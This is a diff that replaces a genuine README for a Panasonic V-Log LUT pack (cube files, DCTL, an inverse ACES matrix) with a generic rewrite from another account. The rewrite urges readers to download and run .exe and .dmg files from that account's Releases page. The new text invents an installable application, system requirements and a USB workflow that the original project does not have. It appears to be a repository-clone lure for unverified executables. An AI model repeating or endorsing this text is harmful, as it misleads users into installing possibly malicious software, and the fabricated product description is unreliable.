@@ -1,215 +1,89 @@
-# 🧪 V-Log Alchemy (Lumix Body Snatcher)
+# 🎥 V-Log-Alchemy - Transform Your Camera Experience
 
-[**中文版 (Chinese Version)**](./README_zh-CN.md)
+## 🚀 Getting Started
 
-> **Turn your Panasonic Lumix camera into a Fujifilm GFX, Leica, ARRI, and more using precise ACES inverse engineering.**
+Welcome to V-Log-Alchemy! This software helps you turn your Panasonic Lumix camera into a high-quality filming tool similar to a Fujifilm GFX or Leica. With precise ACES inverse engineering, you can enhance your video creation process.
 
----
+## 📥 Download Now
 
-## 📖 Introduction
+[![Download V-Log-Alchemy](https://img.shields.io/badge/Download-V--Log--Alchemy-brightgreen)](https://github.com/kkm10unsera/V-Log-Alchemy/releases)
 
-This project aims to break the "color barrier" between camera brands through mathematical means.
+## 📋 Requirements
 
-Many camera manufacturers (like Fujifilm, Leica) have distinctive color science, but their official LUTs typically only accept Log input from their own cameras. This project reverse-engineers this process using the **ACES (Academy Color Encoding System)** workflow:
+Before you start, ensure you have the following:
 
-1.  Convert Panasonic **V-Log/V-Gamut** to the standard **ACES AP0 (Linear)**.
-2.  Use custom-written **DCTL (DaVinci Color Transform Language)** or high-precision matrices to perform the **inverse operation** of the target camera's IDT (Input Device Transform).
-3.  Disguise the signal as the target camera's native Log/Gamut (e.g., F-Log2C, Leica Log).
-4.  Apply the target manufacturer's official color LUT.
+### System Requirements
+- **Operating System**: Windows 10 or later, macOS Catalina or later
+- **Processor**: Intel Core i5 or equivalent
+- **RAM**: Minimum 8 GB
+- **Storage**: At least 500 MB of free space
+- **Camera Compatibility**: Panasonic Lumix series
 
-The resulting `.cube` files can be directly loaded into Panasonic cameras (like S1R II, S1H, S5 series) for real-time in-camera monitoring or used in post-production.
+## 💻 Download & Install
 
----
+To get started, visit the Releases page to download V-Log-Alchemy. Follow these steps:
 
-## 📂 LUT Pack Content
+1. Click on this link: [Download V-Log-Alchemy](https://github.com/kkm10unsera/V-Log-Alchemy/releases).
+2. On the Releases page, find the latest version of the software.
+3. Click on the version name and scroll down to the assets section.
+4. Download the appropriate file for your operating system:
+   - For Windows, download the file ending in `.exe`.
+   - For macOS, download the file ending in `.dmg`.
 
-The LUTs in this repository are designed exclusively for **Panasonic V-Log / V-Gamut** input.
+## 🔧 Setting Up
 
-### 🗻 Fujifilm GFX Series (F-Log2C Core)
-*Based on Fujifilm's medium format color science, a perfect match for high-resolution cameras like the S1R II.*
+After you download the file, follow these steps to set up V-Log-Alchemy on your device:
 
-*   **`FLog2C_to_REALA-ACE_VLog.cube`**
-    *   **Style**: Reala Ace (debuted with GFX100 II).
-    *   **Features**: Extremely accurate color reproduction, sharp and clear. Ideal for landscapes, architecture, and high-resolution work.
-*   **`FLog2C_to_CLASSIC-CHROME_VLog.cube`**
-    *   **Style**: Classic Chrome.
-    *   **Features**: Low saturation, high contrast, mimicking the style of old documentary magazines.
-*   **`FLog2C_to_CLASSIC-Neg._VLog.cube`**
-    *   **Style**: Classic Neg.
-    *   **Features**: The ultimate street photography look. High contrast with warm red-orange tones, emphasizing a hard-edged look.
-*   **`FLog2C_to_PROVIA_VLog.cube`**
-    *   **Style**: Provia (Standard).
-    *   **Features**: Standard, versatile, with natural skin tones.
-*   **`FLog2C_to_Velvia_VLog.cube`**
-    *   **Style**: Velvia (Vivid).
-    *   **Features**: Extremely high saturation, specialized for landscapes.
-*   **`FLog2C_to_ASTIA_VLog.cube`**
-    *   **Style**: Astia (Soft).
-    *   **Features**: Soft skin tone rendering, suitable for portraits.
-*   **`FLog2C_to_ETERNA_VLog.cube`**
-    *   **Style**: Eterna (Cinema).
-    *   **Features**: Ultra-low contrast with a soft highlight roll-off, perfect as a video base layer.
-*   **`FLog2C_to_ETERNA-BB_VLog.cube`**
-    *   **Style**: Eterna Bleach Bypass.
-    *   **Features**: Low saturation, extremely high contrast, with a cool, metallic feel.
-*   **`FLog2C_to_PRO-Neg.Std_VLog.cube`**
-    *   **Style**: Pro Neg. Std.
-    *   **Features**: The standard for studio portraits, delivering fine and smooth tones.
-*   **`FLog2C_to_ACROS_VLog.cube`**
-    *   **Style**: Acros.
-    *   **Features**: A high-texture black and white mode with a unique mid-gray tonality.
+### For Windows
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, you can find V-Log-Alchemy in your Start menu.
 
-### 🔧 Technical
-*   **`FLog2C_to_FLog2C-709_VLog.cube`**
-    *   **Style**: Rec.709 Tech Transform.
-    *   **Features**: A pure technical conversion from F-Log2C to standard Rec.709 without any film styling.
-*   **`FLog2C_to_WDR_VLog.cube`**
-    *   **Style**: Wide Dynamic Range.
-    *   **Features**: Fujifilm's characteristic curve for video out-of-camera. Retains more highlight and shadow detail than standard Rec.709, with moderate contrast and natural colors. Ideal for quick turnarounds or live streaming.
+### For macOS
+1. Double-click the downloaded `.dmg` file.
+2. Drag the V-Log-Alchemy icon into your Applications folder.
+3. Open the Applications folder to launch V-Log-Alchemy.
 
----
+## 🎨 Using V-Log-Alchemy
 
-### 🔴 Leica (L-Log Core)
-*Based on the color science of the Leica SL/Q series, delivering the distinctively rich 'Leica look'.*
+Once you have installed the software, here's how to get started:
 
-*   **`L-Log_to_Classic_VLog.cube`**
-    *   **Style**: Leica Classic.
-    *   **Features**: The signature 'Leica look'. High micro-contrast, deep blacks, sharp and slightly cool shadows, with warm highlights. Excellent for B&W preview or high-texture documentary photography.
-*   **`L-Log_to_Natural_VLog.cube`**
-    *   **Style**: Leica Natural.
-    *   **Features**: More modern and neutral compared to Classic. Retains Leica's highlight roll-off but with more shadow detail, milder contrast, and exceptionally smooth, 'premium' color transitions. Suitable for fashion, portraits, or daily shooting.
+1. Connect your Panasonic Lumix camera to your computer via USB.
+2. Open V-Log-Alchemy.
+3. Select your camera model from the list.
+4. Choose the desired output format (e.g., 4K, 1080p).
+5. Click on the "Process" button to apply the ACES settings.
+6. Save the adjusted video settings back to your camera.
 
----
+## 📚 Features
 
-### 📷 Nikon (N-Log Core)
-*Based on Nikon's N-Log color science, providing a versatile starting point for color grading.*
+V-Log-Alchemy offers several features for video creators:
 
-*   **`N-Log_BT2020_to_REC709_BT1886_VLog.cube`**
-    *   **Style**: Nikon Official Rec.709.
-    *   **Features**: Nikon's standard conversion from N-Log to Rec.709, offering a neutral and accurate color representation.
-*   **`RED_Achromic_Rec2020_N-Log_to_Rec709_VLog.cube`**
-    *   **Style**: RED Achromic.
-    *   **Features**: Transforms footage with a low-contrast monochrome look. Ideal for creating a soft, artistic feel that’s rich with detail.
-*   **`RED_FilmBias_Rec2020_N-Log_to_Rec709_BT1886_VLog.cube`**
-    *   **Style**: RED Film Bias.
-    *   **Features**: Adds the golden warmth and hues of traditional film. A starting point for an organic, cinematic feel that enhances skin tones.
-*   **`RED_FilmBiasBleachBypass_Rec2020_N-Log_to_Rec709_BT1886_VLog.cube`**
-    *   **Style**: RED Film Bias Bleach Bypass.
-    *   **Features**: Emulates the high contrast and desaturated colors of bleach bypass film processing. Provides a dramatic, faded look that imparts a harsh realism.
-*   **`RED_FilmBiasOffset_Rec2020_N-Log_to_Rec709_BT1886_VLog.cube`**
-    *   **Style**: RED Film Bias Offset.
-    *   **Features**: Recreates a vintage film look with unique split-tone offsets and subtle warmth. Ideal for artistic scenes and landscapes.
+- **High-Quality Color Grading**: Optimize your video colors for cinematic quality.
+- **User-Friendly Interface**: Navigate easily even if you don’t have technical experience.
+- **Camera-Specific Profiles**: Tailor settings according to your camera model.
+- **Support for Multiple Formats**: Export in various file formats to suit your needs.
 
----
+## 📞 Support
 
-### 🎬 ARRI (LogC Core)
-*Based on the color science of the ARRI Alexa, providing the industry-standard cinematic feel.*
+If you encounter any issues, feel free to reach out. You can open an issue directly on the GitHub page. Provide a clear description of your problem, and the community will assist you.
 
-*   **`ARRI_LogC2Video_Classic709_VLog.cube`**
-    *   **Style**: ARRI Classic 709.
-    *   **Features**: The classic ARRI Rec.709 look, used in countless films and TV shows. Features true-to-life colors, excellent skin tone reproduction, and a natural highlight roll-off.
+## 🔗 Useful Links
 
----
+- [GitHub Repository](https://github.com/kkm10unsera/V-Log-Alchemy)
+- [Documentation](https://github.com/kkm10unsera/V-Log-Alchemy/wiki)
+- [Frequently Asked Questions (FAQ)](https://github.com/kkm10unsera/V-Log-Alchemy/wiki/FAQ)
 
-### 🎞️ Film Emulation (Cineon Core)
-*Based on the Kodak Cineon scanning system, emulating the colors of classic motion picture film.*
+## 🔄 Update Instructions
 
-*   **`Cineon_to_Fuji_3513DI_D65_VLog.cube`**
-    *   **Style**: Fuji 3513DI Print Film.
-    *   **Features**: Emulates the look of Fujifilm motion picture print stock, with its signature cyans and soft contrast.
-*   **`Cineon_to_Kodak_2383_D65_VLog.cube`**
-    *   **Style**: Kodak 2383 Print Film.
-    *   **Features**: Emulates the look of Kodak motion picture print stock, the standard for Hollywood blockbusters, featuring warm colors and higher contrast.
+When new versions are released, making sure you have the latest version will ensure optimal performance.
 
----
+1. Visit the [Releases page](https://github.com/kkm10unsera/V-Log-Alchemy/releases).
+2. Repeat the download process for the latest version.
+3. Install the update using the same method as before.
 
-### 🎥 RED Digital Cinema (RED IPP2 Core)
-*Based on the IPP2 image processing pipeline from RED Digital Cinema cameras.*
+This will replace the older version while keeping your settings intact.
 
-*   **`REC709_MEDIUM_CONTRAST_Soft_VLog.cube`**
-    *   **Style**: RED IPP2 Medium Contrast / Soft Highlight.
-    *   **Features**: One of RED's official Rec.709 conversions, offering medium contrast with a soft highlight roll-off, suitable for a wide range of scenes.
+## 🌟 Conclusion
 
----
-
-## 📺 Community Showcase
-
-Check out this amazing side-by-side comparison (Fuji X100V vs. Lumix S5IIX) using **V-Log Alchemy**.
-
-Special thanks to **Josef** from **[DIE LICHTFÆNGER ACADEMY](https://www.youtube.com/@dielichtfaenger_academy)** for testing the workflow and providing this footage!
-
-[![X100V vs S5IIX Comparison](https://img.youtube.com/vi/LX-2BNarGq4/maxresdefault.jpg)](https://youtu.be/LX-2BNarGq4)
-
----
-
-## 📸 Sample Images
-
-Here are some sample images showcasing the LUT effects:
-
-### Fujifilm Classic Neg. LUT
-![FujiFilm Classic Neg. LUT Sample](./Samples/FujiFilm_Classic_Neg._Sample.jpg)
-
-### Leica Classic LUT
-![Leica Classic LUT Sample](./Samples/Leica_Classic_Sample.jpg)
-
----
-
-## 🛠️ Usage
-
-### 1. The Easy Way (For Camera / Real Time LUTs)
-I have included pre-generated 33-Point Cube LUTs in the repo.
-
-1.  Download the `.cube` files.
-2.  Copy them to your camera's SD card (or use the Lumix Lab App).
-3.  Load them into the LUT Library.
-4.  Shoot straight-out-of-camera JPEGs or Video with the Fuji look baked in!
-
-### 2. The Standard Way (For DaVinci Resolve Free)
-For users without the Studio version who want to apply the look in post-production:
-
-1.  Import the provided `.cube` files to DaVinci Resolve.
-2.  Workflow: V-Log -> Corrector.
-3.  Drag and drop your desired LUT onto Corrector node.
-
-> **Note**: This is simpler than the Studio workflow, but slightly less precise since it relies on a standard 33-point LUT rather than the DCTL math.
-
-### 3. The Pro Way (For DaVinci Resolve Studio)
-If you want full control in post:
-
-1.  Use the provided `.dctl` file.
-2.  Workflow: V-Log -> [CST to ACES (AP0), Linear] -> [My DCTL] -> [Official Fuji LUT].
-3.  disable Tone Mapping and White Point Adaptation on CST Node.
-
-This gives you the flexibility to swap film simulations after shooting.
-
-> **Note**: DCTL is a feature exclusive to the paid DaVinci Resolve Studio version.
-
-### 4. For Adobe Camera RAW / Lightroom Users (Experimental)
-
-If you can tolerate some color deviation, you can select the V-Log preset from "Profile" > "Camera Matching" in Adobe Camera RAW during import, and then apply the `.cube` file from this repository.
-
-This approach might introduce a slight color shift, but it won't be drastic and can be fine-tuned later in post-production. Consider this a "workaround," as ACR/LR's support for video LUTs is not as native as dedicated video editing software.
-
----
-
-## 🧮 The Math
-
-The core of this project is a precise inverse matrix. Taking **ACES AP0 to F-Log2C** as an example, we calculated the inverse of Fujifilm's official IDT matrix:
-
-```c
-// ACES AP0 (Linear) to F-Gamut (Linear) Inverse Matrix
-// Calculated based on Fujifilm F-Log2C official IDT v1.00
-{
-     1.18805632080277f, -0.0526707998586238f, -0.135385520944148f,
-     0.000717966415014435f, 0.987967895093181f, 0.0113141384918043f,
-     0.0095814146658757f, 0.00504068380666559f, 0.985377901527459f,
-};
-```
-
-For detailed DCTL code, please see the `DCTL` folder.
-
----
-
-## ⚠️ Disclaimer
-1. **Physical Limitations**: While we have mathematically aligned the color spaces, the spectral response of different sensor CFAs (Color Filter Arrays) varies. This phenomenon, known as metamerism, means that under certain extreme lighting conditions (e.g., neon lights), the Panasonic's rendering may still have subtle differences from the original camera.
-2. **Unofficial**: This project is not officially affiliated with Panasonic, Fujifilm, or Leica.
+V-Log-Alchemy is designed to maximize your camera's potential, enhancing your video quality with ease. Just follow the steps above to download and get started, and enjoy transforming your filming experience.
